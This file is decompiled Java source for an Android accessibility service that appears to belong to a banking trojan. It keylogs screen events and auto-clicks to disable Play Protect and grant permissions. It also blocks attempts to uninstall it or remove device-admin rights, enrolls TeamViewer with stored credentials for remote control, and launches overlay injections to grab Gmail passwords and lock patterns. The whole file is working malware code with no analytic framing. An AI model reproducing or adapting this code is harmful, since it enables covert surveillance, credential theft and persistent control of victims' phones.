package com.example.mmm.Service;

import com.example.mmm.*;
import com.example.mmm.Utils.*;
import com.example.mmm.API.*;
import android.util.*;
import android.view.accessibility.*;
import java.text.*;
import java.util.*;
import android.os.*;
import android.graphics.*;
import com.example.mmm.Activity.*;
import android.content.*;
import android.accessibilityservice.*;

public class srvAccessibility extends AccessibilityService
{
    utils utl;
    constants consts;
    utils2 utl2;
    String groups$;
    private String TAG_LOG;
    private boolean myers$;
    private String textKeylogger;
    private String packageAppStart;
    private String strText;
    private String className;
    private String app_inject;
    private String quantity$;
    private String reforms$;
    private String papers$;
    private String marie$;
    private int becomes$;
    private boolean admit$;
    private boolean drill$;
    private boolean grenada$;
    private boolean capable$;
    private boolean touring$;
    
    public srvAccessibility() {
        super();
        this.utl = new utils();
        this.consts = new constants();
        this.utl2 = new utils2();
        final StringBuilder sb = new StringBuilder();
        sb.append(srvAccessibility.class.getSimpleName());
        sb.append("   ");
        this.TAG_LOG = sb.toString();
        this.myers$ = false;
        this.textKeylogger = "";
        this.packageAppStart = "";
        this.strText = "";
        this.className = "";
        this.app_inject = "";
        this.quantity$ = "";
        this.reforms$ = "";
        this.papers$ = "";
        this.marie$ = "";
        this.becomes$ = 0;
        this.admit$ = false;
        this.drill$ = false;
        this.grenada$ = false;
        this.capable$ = false;
        this.touring$ = false;
        this.groups$ = "0";
    }
    
    private static String getEventText(final AccessibilityEvent accessibilityEvent) {
        final StringBuilder sb = new StringBuilder();
        final Iterator<CharSequence> iterator = accessibilityEvent.getText().iterator();
        while (iterator.hasNext()) {
            sb.append(iterator.next());
        }
        return sb.toString();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    private void blockBack() {
        if (Build$VERSION.SDK_INT <= 15) {
            return;
        }
        int n = 0;
        while (true) {
            this.performGlobalAction(1);
            ++n;
        }
    }
    
    private void a(final AccessibilityNodeInfo accessibilityNodeInfo) {
        if (!this.capable$ && Build$VERSION.SDK_INT >= 18) {
            if (accessibilityNodeInfo == null) {
                this.utl.Log(this.TAG_LOG, "nodeInfo == null");
                return;
            }
            final Iterator iterator = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("com.android.vending:id/toolbar_item_play_protect_settings").iterator();
            while (iterator.hasNext()) {
                iterator.next();
                this.blockBack2();
            }
            final Iterator iterator2 = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("com.android.vending:id/play_protect_settings").iterator();
            while (iterator2.hasNext()) {
                iterator2.next();
                this.blockBack2();
            }
            if (this.className.equals("com.google.android.gms.security.settings.verifyappssettingsactivity")) {
                this.blockBack2();
            }
        }
    }
    
    private void a(final AccessibilityNodeInfo accessibilityNodeInfo, String s) {
        s = "str";
        if (Build$VERSION.SDK_INT > 18 && accessibilityNodeInfo != null) {
            for (int childCount = accessibilityNodeInfo.getChildCount(), i = 0; i < childCount; ++i) {
                final AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child == null) {
                    return;
                }
                final StringBuilder sb = new StringBuilder();
                sb.append(s);
                sb.append(" > ");
                sb.append(child.getClassName().toString());
                final String string = sb.toString();
                String string2 = "";
                if (child.getText() != null) {
                    string2 = child.getText().toString();
                }
                final StringBuilder sb2 = new StringBuilder();
                final StringBuilder sb3 = new StringBuilder();
                sb3.append(i);
                sb3.append(" Class: ");
                sb2.append(sb3.toString());
                sb2.append(child.getClassName().toString());
                sb2.append("; Text: ");
                sb2.append(string2);
                sb2.append("; ID: ");
                sb2.append(child.getViewIdResourceName());
                sb2.append("; ");
                sb2.append(string);
                this.utl.Log("A_A_A", sb2.toString());
                if (this.className.contains("com.google.android.finsky.activities.mainactivity")) {}
                if (this.groups$.equals("1")) {}
                this.a(child, string);
            }
        }
    }
    
    private void blockBack2() {
        if (Build$VERSION.SDK_INT <= 15) {
            return;
        }
        int n = 0;
        while (true) {
            this.performGlobalAction(1);
            ++n;
        }
    }
    
    private void b(final AccessibilityNodeInfo accessibilityNodeInfo, final String s) {
        if (accessibilityNodeInfo == null) {
            this.utl.Log(this.TAG_LOG, "nodeInfo == null");
            return;
        }
        if (this.capable$ && Build$VERSION.SDK_INT >= 18) {
            if (this.packageAppStart.equals("com.android.vending")) {
                if (this.groups$.equals("1")) {
                    final int \u0131nt = Integer.parseInt(this.utl.SettingsRead((Context)this, "SW"));
                    for (int \u0131nt2 = Integer.parseInt(this.utl.SettingsRead((Context)this, "SE")), i = 0; i < \u0131nt2 / 2; i += 50) {
                        final Iterator<AccessibilityNodeInfo> iterator = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("android:id/button1").iterator();
                        if (iterator.hasNext()) {
                            iterator.next().performAction(16);
                            this.groups$ = "0";
                            this.utl.SettingsWrite((Context)this, "SR", "0");
                            this.capable$ = false;
                            this.blockBack2();
                        }
                        if (this.groups$.isEmpty()) {
                            break;
                        }
                        utils2._plains(this, \u0131nt / 2, i + 40);
                    }
                }
                this.a(accessibilityNodeInfo, "str");
                if (s.contains("com.google.android.finsky.activities.mainactivity")) {
                    final int \u0131nt3 = Integer.parseInt(this.utl.SettingsRead((Context)this, "SW"));
                    final int \u0131nt4 = Integer.parseInt(this.utl.SettingsRead((Context)this, "SE"));
                    this.groups$ = "1";
                    for (int j = 0; j < \u0131nt4 / 2; j += 5) {
                        utils2._plains(this, \u0131nt3 - 10, j);
                    }
                }
                final String[] array = { "com.android.vending:id/toolbar_item_play_protect_settings", "com.android.vending:id/play_protect_settings", "android:id/button1" };
                int n = 0;
                while (true) {
                    final Iterator iterator2 = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(array[n]).iterator();
                    while (iterator2.hasNext()) {
                        iterator2.next().performAction(16);
                        this.groups$ = "1";
                        if (array[n].equals("android:id/button1")) {
                            this.groups$ = "0";
                            this.capable$ = false;
                            this.utl.SettingsWrite((Context)this, "SR", "0");
                            this.blockBack2();
                        }
                    }
                    ++n;
                }
            }
            else {
                if (s.equals("com.google.android.gms.security.settings.verifyappssettingsactivity")) {
                    this.groups$ = "1";
                    accessibilityNodeInfo.performAction(4096);
                    final int \u0131nt5 = Integer.parseInt(this.utl.SettingsRead((Context)this, "SW"));
                    int k;
                    for (int n2 = k = Integer.parseInt(this.utl.SettingsRead((Context)this, "SE")); k > 30; k -= 15) {
                        utils2._plains(this, \u0131nt5 / 2, n2 - k);
                    }
                    return;
                }
                if (s.equals("android.app.alertdialog") && this.groups$.equals("1")) {
                    final Iterator<AccessibilityNodeInfo> iterator3 = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("android:id/button1").iterator();
                    while (iterator3.hasNext()) {
                        iterator3.next().performAction(16);
                        this.groups$ = "0";
                        this.capable$ = false;
                        this.blockBack2();
                    }
                }
            }
        }
    }
    
    public void onAccessibilityEvent(final AccessibilityEvent accessibilityEvent) {
        if (4 == accessibilityEvent.getEventType() && !utils.getScreenBoolean((Context)this)) {
            this.utl.Log(this.TAG_LOG, "click unlock device");
            if (this.myers$) {
                final String format = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US).format(Calendar.getInstance().getTime());
                final StringBuilder sb = new StringBuilder();
                sb.append(this.textKeylogger);
                sb.append(format);
                sb.append("[Focused]");
                sb.append("click unlock device");
                sb.append("[#2453102]");
                this.textKeylogger = sb.toString();
            }
        }
        if (!utils.getScreenBoolean((Context)this)) {
            return;
        }
        if (accessibilityEvent == null) {
            return;
        }
        if (this.myers$) {
            final String format2 = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US).format(Calendar.getInstance().getTime());
            final int eventType = accessibilityEvent.getEventType();
            if (eventType != 1) {
                if (eventType != 8) {
                    if (eventType != 16) {
                        if (accessibilityEvent.getText().toString().length() >= 3) {
                            final StringBuilder sb2 = new StringBuilder();
                            sb2.append(this.textKeylogger);
                            sb2.append(format2);
                            sb2.append("[Focused]");
                            sb2.append(accessibilityEvent.getText().toString().length());
                            sb2.append(" # ");
                            sb2.append(accessibilityEvent.getText().toString());
                            sb2.append("[#2453102]");
                            this.textKeylogger = sb2.toString();
                        }
                    }
                    else if (!accessibilityEvent.getText().toString().equals("")) {
                        final StringBuilder sb3 = new StringBuilder();
                        sb3.append(this.textKeylogger);
                        sb3.append(format2);
                        sb3.append("[Wtore Text]");
                        sb3.append(accessibilityEvent.getText().toString());
                        sb3.append("[#2453102]");
                        this.textKeylogger = sb3.toString();
                    }
                }
                else if (!accessibilityEvent.getText().toString().equals("")) {
                    final StringBuilder sb4 = new StringBuilder();
                    sb4.append(this.textKeylogger);
                    sb4.append(format2);
                    sb4.append("[Focused]");
                    sb4.append(accessibilityEvent.getText().toString());
                    sb4.append("[#2453102]");
                    this.textKeylogger = sb4.toString();
                }
            }
            else if (!accessibilityEvent.getText().toString().equals("")) {
                final StringBuilder sb5 = new StringBuilder();
                sb5.append(this.textKeylogger);
                sb5.append(format2);
                sb5.append("[Click]");
                sb5.append(accessibilityEvent.getText().toString());
                sb5.append("[#2453102]");
                this.textKeylogger = sb5.toString();
            }
        }
        this.app_inject = accessibilityEvent.getPackageName().toString();
        this.packageAppStart = accessibilityEvent.getPackageName().toString().toLowerCase();
        this.strText = getEventText(accessibilityEvent).toLowerCase();
        this.className = accessibilityEvent.getClassName().toString().toLowerCase();
        if (32 == accessibilityEvent.getEventType()) {
            final AccessibilityNodeInfo source = accessibilityEvent.getSource();
            final utils utl = this.utl;
            final String tag_LOG = this.TAG_LOG;
            final StringBuilder sb6 = new StringBuilder();
            sb6.append("packageApp{");
            sb6.append(this.packageAppStart);
            sb6.append("} strText{");
            sb6.append(this.strText);
            sb6.append("} className{");
            sb6.append(this.className);
            sb6.append("}");
            utl.Log(tag_LOG, sb6.toString());
            this.utl._currency((Context)this);
            if (this.utl2._console(this, accessibilityEvent, this.className)) {
                this.blockBack2();
            }
            this.utl2._presence(this, accessibilityEvent, this.packageAppStart);
            this.utl2._referral(accessibilityEvent, this.className);
            this.utl2._obtain(accessibilityEvent, this.className);
            if (Build$VERSION.SDK_INT >= 29) {
                final utils2 utl2 = this.utl2;
                final String packageAppStart = this.packageAppStart;
                final String strText = this.strText;
                final String className = this.className;
                final boolean b = Build$VERSION.SDK_INT >= 18 && className.equals("com.android.settings.applications.installedappdetailstop") && packageAppStart.equals("com.android.settings") && strText.length() > 10;
            }
            if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10) {
                if (this.utl.SettingsRead((Context)this, "XB").equals("1")) {
                    this.touring$ = true;
                }
                else {
                    this.touring$ = false;
                }
                if (!this.touring$) {
                    if (!this.className.contains("com.miui.permcenter.permissions.permissionseditoractivity")) {
                        this.utl2._cornell((Context)this);
                    }
                    if (this.utl2._declared(this, accessibilityEvent, this.className)) {
                        this.utl2._fires((Context)this);
                        this.touring$ = true;
                        this.blockBack2();
                    }
                }
                else if (this.className.contains("com.miui.permcenter.permissions.permissionseditoractivity") && this.strText.contains(this.utl.getLabelApplication((Context)this).toLowerCase())) {
                    this.blockBack2();
                }
                if (this.className.contains("com.miui.permcenter.autostart.autostartmanagementactivity")) {
                    if (!this.utl.SettingsRead((Context)this, "XS").equals("1")) {
                        if (this.utl2._bases(this, accessibilityEvent, this.className)) {
                            this.utl.Log(this.TAG_LOG, "Click AutoStart");
                            this.utl.SettingsWrite((Context)this, "XS", "1");
                            this.blockBack2();
                            if (!this.utl.SettingsRead((Context)this, "XH").equals("1")) {
                                this.utl2._tulsa((Context)this);
                            }
                        }
                    }
                    else {
                        this.blockBack();
                    }
                }
                if (this.className.contains("com.miui.powerkeeper.ui.hiddenappsconfigactivity")) {
                    if (!this.utl.SettingsRead((Context)this, "XH").equals("1")) {
                        if (this.utl2._phone(accessibilityEvent, this.className)) {
                            this.utl.Log(this.TAG_LOG, "Click isXiaomiHiddenappsconfigactivity");
                            this.utl.SettingsWrite((Context)this, "XH", "1");
                            this.blockBack2();
                        }
                    }
                    else if (this.strText.contains(this.utl.getLabelApplication((Context)this).toLowerCase())) {
                        this.blockBack();
                    }
                }
                if (this.strText.contains(this.utl.getLabelApplication((Context)this).toLowerCase()) && this.className.contains("com.miui.appmanager.applicationsdetailsactivity")) {
                    this.blockBack();
                }
                if (this.packageAppStart.contains("com.miui.cleanmaster") && this.className.contains("com.miui.optimizecenter.deepclean.installedapp.installedappsactivity")) {
                    this.blockBack();
                }
            }
            if (!this.packageAppStart.isEmpty()) {
                this.utl.SettingsWrite((Context)this, "RW", this.packageAppStart);
            }
            if (Build$VERSION.SDK_INT > 15 && "com.android.settings.SubSettings".equals(accessibilityEvent.getClassName()) && this.strText.equals("g\u00c3¼ncelleme".toLowerCase())) {
                this.blockBack();
                this.utl.SettingsToAdd((Context)this, "AS", "Blocked attempt to disable accessibility service[143523#]");
            }
            this.quantity$ = this.utl.SettingsRead((Context)this, "RE");
            this.reforms$ = this.utl.SettingsRead((Context)this, "GE");
            if (this.utl.SettingsRead((Context)this, "AC").equals("1")) {
                this.myers$ = true;
            }
            else {
                this.myers$ = false;
            }
            if (this.utl.SettingsRead((Context)this, "SR").equals("1")) {
                this.capable$ = true;
            }
            else {
                this.capable$ = false;
            }
            if (this.textKeylogger.length() > 20) {
                final utils utl3 = this.utl;
                final String tag_LOG2 = this.TAG_LOG;
                final StringBuilder sb7 = new StringBuilder();
                sb7.append("Log Keylogger Size: ");
                sb7.append(this.textKeylogger.length());
                utl3.Log(tag_LOG2, sb7.toString());
                this.utl.SettingsToAdd((Context)this, "AM", this.textKeylogger);
                this.textKeylogger = "";
            }
            if (source == null) {
                this.utl.Log(this.TAG_LOG, "nodeInfo == null");
                return;
            }
            if (Build$VERSION.SDK_INT >= 18) {
                if (this.utl.SettingsRead((Context)this, "SQ").equals("1")) {
                    final String[] array = { "com.android.packageinstaller:id/permission_allow_button", "com.android.permissioncontroller:id/permission_allow_button", "android:id/button1", "com.android.settings:id/action_button", "com.android.settings:id/button1" };
                    int n = 0;
                    while (true) {
                        final Iterator iterator = source.findAccessibilityNodeInfosByViewId(array[n]).iterator();
                        while (iterator.hasNext()) {
                            iterator.next().performAction(16);
                            this.utl.SettingsWrite((Context)this, "SQ", "");
                            this.utl.Log(this.TAG_LOG, "-=CLICK BUTTON=-");
                            if (array[n].contains("com.android.settings:id/action_button") && !utils._exercise((Context)this)) {
                                final Rect rect = new Rect();
                                source.getBoundsInScreen(rect);
                                int n2 = 0;
                                while (true) {
                                    utils2._plains(this, rect.centerX(), rect.centerY() - 250 + n2);
                                    if (utils._exercise((Context)this)) {
                                        break;
                                    }
                                    n2 += 4;
                                }
                            }
                        }
                        ++n;
                    }
                }
                else if (!this.utl.SettingsRead((Context)this, "QR").isEmpty()) {
                    final String s = "com.android.settings:id/left_button";
                    final String s2 = "android:id/button1";
                    int n3 = 0;
                    while (true) {
                        final Iterator iterator2 = source.findAccessibilityNodeInfosByViewId((new String[] { s, s2 })[n3]).iterator();
                        while (iterator2.hasNext()) {
                            iterator2.next().performAction(16);
                        }
                        ++n3;
                    }
                }
            }
        }
        this.a(accessibilityEvent.getSource());
        this.b(accessibilityEvent.getSource(), this.className);
        if (!this.utl.SettingsRead((Context)this, "QR").equals(this.getPackageName())) {
            if (accessibilityEvent.getPackageName().toString().contains("com.google.android.packageinstaller") && this.className.contains("android.app.alertdialog") && this.strText.contains(this.utl.getLabelApplication((Context)this).toLowerCase())) {
                this.blockBack();
                final utils utl4 = this.utl;
                final String s3 = "AS";
                final StringBuilder sb8 = new StringBuilder();
                sb8.append("Blocked attempt to remove bot");
                sb8.append("[143523#]");
                utl4.SettingsToAdd((Context)this, s3, sb8.toString());
            }
            if ((this.className.equals("android.support.v7.widget.recyclerview") || this.className.equals("android.widget.linearlayout")) && (accessibilityEvent.getPackageName().toString().equals("com.android.settings") || accessibilityEvent.getPackageName().toString().equals("com.miui.securitycenter")) && this.strText.contains(this.utl.getLabelApplication((Context)this).toLowerCase()) && !this.strText.contains("euwvxmpnqta".toLowerCase())) {
                this.blockBack();
                final utils utl5 = this.utl;
                final String s4 = "AS";
                final StringBuilder sb9 = new StringBuilder();
                sb9.append("Blocked attempt to remove bot");
                sb9.append("[143523#]");
                utl5.SettingsToAdd((Context)this, s4, sb9.toString());
            }
            if (this.className.equals("com.android.settings.deviceadminadd") && utils._exercise((Context)this)) {
                this.blockBack();
                final utils utl6 = this.utl;
                final String s5 = "AS";
                final StringBuilder sb10 = new StringBuilder();
                sb10.append("Blocked attempt to disable admin device");
                sb10.append("[143523#]");
                utl6.SettingsToAdd((Context)this, s5, sb10.toString());
            }
            if (accessibilityEvent.getPackageName().toString().contains("com.google.android.packageinstaller") && this.className.contains("android.app.alertdialog") && this.strText.contains("host") && this.utl.SettingsRead((Context)this, "RA").equals("true")) {
                this.blockBack();
                final utils utl7 = this.utl;
                final String s6 = "AS";
                final StringBuilder sb11 = new StringBuilder();
                sb11.append("Blocked attempt to remove TeamViewer");
                sb11.append("[143523#]");
                utl7.SettingsToAdd((Context)this, s6, sb11.toString());
            }
            if ((this.className.equals("android.support.v7.widget.recyclerview") || this.className.equals("android.widget.linearlayout")) && (accessibilityEvent.getPackageName().toString().equals("com.android.settings") || accessibilityEvent.getPackageName().toString().equals("com.miui.securitycenter")) && this.strText.contains("host") && this.utl.SettingsRead((Context)this, "RA").equals("true")) {
                this.blockBack();
                final utils utl8 = this.utl;
                final String s7 = "AS";
                final StringBuilder sb12 = new StringBuilder();
                sb12.append("Blocked attempt to remove TeamViewer");
                sb12.append("[143523#]");
                utl8.SettingsToAdd((Context)this, s7, sb12.toString());
            }
        }
        if (Build$VERSION.SDK_INT >= 18) {
            if (this.packageAppStart.contains("com.teamviewer.host.market")) {
                final AccessibilityNodeInfo selling = utils2._selling(accessibilityEvent, "com.teamviewer.host.market:id/host_assign_device_username");
                final AccessibilityNodeInfo selling2 = utils2._selling(accessibilityEvent, "com.teamviewer.host.market:id/host_assign_device_password");
                final AccessibilityNodeInfo selling3 = utils2._selling(accessibilityEvent, "com.teamviewer.host.market:id/host_assign_device_submit_button");
                if (selling != null) {
                    this.papers$ = this.utl.SettingsRead((Context)this, "RT");
                    if (!this.papers$.isEmpty()) {
                        this.marie$ = this.utl.SettingsRead((Context)this, "RY");
                        this.grenada$ = false;
                        this.drill$ = false;
                        this.admit$ = false;
                        this.becomes$ = 0;
                        this.utl.SettingsWrite((Context)this, "RT", "");
                        this.utl.SettingsWrite((Context)this, "RY", "");
                    }
                }
                if (this.becomes$ == 0) {
                    final AccessibilityNodeInfo selling4 = utils2._selling(accessibilityEvent, "com.teamviewer.host.market:id/action_bar_root");
                    final AccessibilityNodeInfo selling5 = utils2._selling(accessibilityEvent, "com.teamviewer.host.market:id/buttonPanel");
                    if (selling4 != null && selling5 != null) {
                        this.becomes$ = 1;
                        final AccessibilityNodeInfo selling6 = utils2._selling(accessibilityEvent, "android:id/button1");
                        if (selling6 != null) {
                            this.utl2._shannon(selling6);
                        }
                        final AccessibilityNodeInfo selling7 = utils2._selling(accessibilityEvent, "com.samsung.klmsagent:id/checkBox1");
                        final AccessibilityNodeInfo selling8 = utils2._selling(accessibilityEvent, "com.samsung.klmsagent:id/btn_confirm");
                        if (selling7 != null && this.becomes$ == 1) {
                            this.utl2._shannon(selling7);
                            this.utl2._shannon(selling8);
                            this.becomes$ = 2;
                            utils.runApplication((Context)this, "com.teamviewer.host.market");
                        }
                    }
                }
                if (!this.papers$.isEmpty() && !this.marie$.isEmpty()) {
                    if (selling != null && !this.admit$) {
                        utils2._batch(selling, this.papers$);
                        this.admit$ = true;
                    }
                    if (selling2 != null && !this.drill$) {
                        utils2._batch(selling2, this.marie$);
                        this.drill$ = true;
                    }
                    if (this.admit$ && this.drill$ && !this.grenada$) {
                        this.becomes$ = 0;
                        this.utl2._shannon(selling3);
                        this.grenada$ = true;
                        if (this.utl.SettingsRead((Context)this, "RI").equals("true")) {
                            this.blockBack2();
                        }
                    }
                }
            }
            else if (this.packageAppStart.contains("com.samsung.klmsagent")) {
                final AccessibilityNodeInfo selling9 = utils2._selling(accessibilityEvent, "com.samsung.klmsagent:id/checkBox1");
                final AccessibilityNodeInfo selling10 = utils2._selling(accessibilityEvent, "com.samsung.klmsagent:id/btn_confirm");
                if (selling9 != null && this.becomes$ == 1) {
                    this.utl2._shannon(selling9);
                    this.utl2._shannon(selling10);
                    this.becomes$ = 2;
                    utils.runApplication((Context)this, "com.teamviewer.host.market");
                }
            }
            else {
                this.becomes$ = 0;
            }
            if (this.packageAppStart.contains("com.teamviewer.host.market") && this.utl.SettingsRead((Context)this, "RA").equals("true")) {
                this.blockBack2();
            }
        }
        if (!this.quantity$.isEmpty() || !this.reforms$.isEmpty()) {
            if (32 == accessibilityEvent.getEventType()) {
                if (!this.quantity$.isEmpty()) {
                    final Intent \u0131ntent = new Intent((Context)this, (Class)actViewInjection.class);
                    \u0131ntent.addFlags(268435456);
                    \u0131ntent.addFlags(8388608);
                    this.utl.SettingsWrite((Context)this, "RF", "grabbing_pass_gmail");
                    this.startActivity(\u0131ntent);
                }
                if (!this.reforms$.isEmpty()) {
                    final Intent \u0131ntent2 = new Intent((Context)this, (Class)actViewInjection.class);
                    \u0131ntent2.addFlags(268435456);
                    \u0131ntent2.addFlags(8388608);
                    this.utl.SettingsWrite((Context)this, "RF", "grabbing_lockpattern");
                    this.startActivity(\u0131ntent2);
                }
            }
            return;
        }
        final String settingsRead = this.utl.SettingsRead((Context)this, "QP");
        if (!settingsRead.isEmpty() && settingsRead.contains(this.app_inject) && this.app_inject.contains(".") && utils.getScreenBoolean((Context)this)) {
            final Intent \u0131ntent3 = new Intent((Context)this, (Class)actViewInjection.class);
            \u0131ntent3.addFlags(268435456);
            \u0131ntent3.addFlags(8388608);
            this.utl.SettingsWrite((Context)this, "RF", this.app_inject);
            this.startActivity(\u0131ntent3);
        }
    }
    
    public void onInterrupt() {
        this.utl.Log(this.TAG_LOG, "onInterrupt");
    }
    
    protected void onServiceConnected() {
        super.onServiceConnected();
        this.utl.Log(this.TAG_LOG, "onServiceConnected");
        this.blockBack2();
        final AccessibilityServiceInfo serviceInfo = new AccessibilityServiceInfo();
        serviceInfo.flags = 17;
        serviceInfo.eventTypes = -1;
        serviceInfo.feedbackType = 16;
        this.setServiceInfo(serviceInfo);
    }
}
